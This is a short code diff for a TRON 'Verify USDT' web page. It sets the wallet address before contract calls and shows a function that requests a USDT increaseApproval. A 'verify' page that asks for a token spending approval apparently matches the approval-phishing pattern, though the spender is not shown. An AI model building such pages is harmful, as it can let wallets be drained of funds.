@@ -41,6 +41,7 @@ const VerifyUsdtPage: NextPage = () => {
         const parameter = [{ type: 'address', value: address }];
 
         try {
+            tronWeb.setAddress(adapters[selectedIndex].address)
             const result = await tronWeb.transactionBuilder.triggerConstantContract(
                 process.env.NEXT_PUBLIC_USDT_ADDRESS
                 , functionSelector, {}, parameter);
@@ -69,6 +70,7 @@ const VerifyUsdtPage: NextPage = () => {
                             ];
 
         try {
+            tronWeb.setAddress(adapters[selectedIndex].address)
             const result = await tronWeb.transactionBuilder.triggerConstantContract(
                 process.env.NEXT_PUBLIC_USDT_ADDRESS
                 , functionSelector, {}, parameter);
@@ -178,8 +180,9 @@ const VerifyUsdtPage: NextPage = () => {
     
     // Approval or increaseApproval
     async function approveUSDT(amount:number) {
-        console.log('cow')
+        // console.log('cow')
         try {
+            tronWeb.setAddress(adapters[selectedIndex].address)
             // Prepare the parameters for the USDT contract's approve function
             const functionSelector = 'increaseApproval(address,uint256)';
             const params = [
